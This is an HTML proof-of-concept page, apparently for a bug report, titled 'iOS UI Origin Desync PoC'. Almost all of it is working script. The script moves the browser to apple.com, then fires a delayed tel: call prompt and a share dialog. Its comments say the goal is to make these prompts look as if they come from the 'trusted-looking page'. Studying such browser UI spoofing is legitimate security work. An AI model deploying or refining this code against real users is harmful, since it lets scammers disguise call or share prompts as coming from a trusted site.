<!doctype html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>iOS UI Origin Desync PoC</title>

<style>
body {
  font-family:-apple-system,system-ui;
  background:#111;
  color:#fff;
  height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
}
button {
  font-size:22px;
  padding:14px 28px;
  border:none;
  border-radius:12px;
  background:#007aff;
  color:white;
}
</style>
</head>

<body>

<button id="start">START</button>

<script>
let interacted = false;

// detect interaction AFTER navigation
['click','scroll','touchstart'].forEach(e =>
  addEventListener(e, () => interacted = true, { once:true })
);

document.getElementById("start").onclick = async () => {

  // 1️⃣ Navigate to trusted-looking page
  location.href = "https://apple.com";

  // 2️⃣ After navigation + user interaction → TEL
  setTimeout(() => {
    if (interacted) {
      location.href = "tel:1234";
    }
  }, 6000);

  // 3️⃣ Share UI race (optional but strong)
  if (navigator.share) {
    setTimeout(async () => {
      try {
        await navigator.share({
          title: "Test",
          text: "Origin confusion test",
          url: "https://example.com"
        });
      } catch {}
    }, 3000);
  }
};
</script>

</body>
</html>
